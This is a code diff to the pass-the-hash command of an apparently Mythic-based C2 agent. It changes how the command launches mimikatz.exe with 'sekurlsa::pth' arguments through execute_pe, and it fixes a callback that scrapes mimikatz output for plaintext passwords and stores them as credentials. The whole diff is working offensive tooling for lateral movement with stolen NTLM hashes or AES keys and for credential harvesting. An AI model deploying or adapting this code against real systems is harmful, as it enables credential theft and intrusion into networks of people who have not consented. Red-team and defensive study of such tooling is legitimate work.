@@ -2,6 +2,7 @@ from mythic_container.MythicCommandBase import *
 from mythic_container.MythicRPC import *
 import mslex
 import re
+from .execute_pe import *
 
 
 def valid_ntlm_hash(hash):
@@ -155,7 +156,7 @@ class PthArguments(TaskArguments):
                             "Selected credential is not a valid AES128 or AES256 key."
                         )
                 else:   # TODO: Add hash credential type check when Apollo supports tagging
-                        # credential types in Mimikatz output
+                    # credential types in Mimikatz output
                     ntlm_hash = credential["credential"]
                     if not valid_ntlm_hash(ntlm_hash):
                         raise ValueError(
@@ -179,7 +180,7 @@ async def parse_credentials(
         Success=True, TaskStatus="success", Completed=True
     )
     responses = await SendMythicRPCResponseSearch(
-        MythicRPCResponseSearchMessage(TaskID=task.SubtaskData.Task.ID)
+        MythicRPCResponseSearchMessage(TaskID=task.TaskData.Task.ID)
     )
     for output in responses.Responses:
         mimikatz_out = str(output.Response)
@@ -199,7 +200,7 @@ async def parse_credentials(
                     if passwd != "(null)":
                         cred_resp = await SendMythicRPCCredentialCreate(
                             MythicRPCCredentialCreateMessage(
-                                TaskID=task.SubtaskData.Task.ID,
+                                TaskID=task.TaskData.Task.ID,
                                 Credentials=[
                                     MythicRPCCredentialData(
                                         credential_type="plaintext",
@@ -224,21 +225,16 @@ class PthCommand(CommandBase):
     description = (
         "Spawn a new process using the specified domain user's credential material."
     )
-    version = 3
+    version = 4
     author = "@djhohnstein"
     argument_class = PthArguments
     attackmapping = ["T1550"]
-    script_only = True
+    script_only = False
     completion_functions = {"parse_credentials": parse_credentials}
 
     async def create_go_tasking(
         self, taskData: PTTaskMessageAllData
     ) -> PTTaskCreateTaskingMessageResponse:
-        response = PTTaskCreateTaskingMessageResponse(
-            TaskID=taskData.Task.ID,
-            Success=True,
-        )
-
         user = taskData.args.get_arg("user")
         domain = taskData.args.get_arg("domain")
 
@@ -261,21 +257,24 @@ class PthCommand(CommandBase):
             run = mslex.quote(run, for_cmd = False)
             arguments += f" /run:{run}"
 
-        response.DisplayParams = arguments
         arguments = "sekurlsa::pth " + arguments
-
-        await SendMythicRPCTaskCreateSubtask(
-            MythicRPCTaskCreateSubtaskMessage(
-                TaskID=taskData.Task.ID,
-                CommandName="execute_pe",
-                Params=json.dumps({
-                    "pe_name": "mimikatz.exe",
-                    "pe_arguments": mslex.quote(arguments, for_cmd = False),
-                }),
-                SubtaskCallbackFunction="parse_credentials",
-            )
-        )
-        return response
+        executePEArgs = ExecutePEArguments(command_line=json.dumps({
+            "pe_name": "mimikatz.exe",
+            "pe_arguments": mslex.quote(arguments, for_cmd = False),
+        }))
+        await executePEArgs.parse_arguments()
+        executePECommand = ExecutePECommand(agent_path=self.agent_code_path,
+                                            agent_code_path=self.agent_code_path,
+                                            agent_browserscript_path=self.agent_browserscript_path)
+        # set our taskData args to be the new ones for execute_pe
+        taskData.args = executePEArgs
+        # executePE's creat_go_tasking function returns a response for us
+        newResp = await executePECommand.create_go_tasking(taskData=taskData)
+        # update the response to make sure this gets pulled down as execute_pe instead of mimikatz
+        newResp.CommandName = "execute_pe"
+        newResp.DisplayParams = arguments
+        newResp.CompletionFunctionName = "parse_credentials"
+        return newResp
 
     async def process_response(
         self, task: PTTaskMessageAllData, response: any
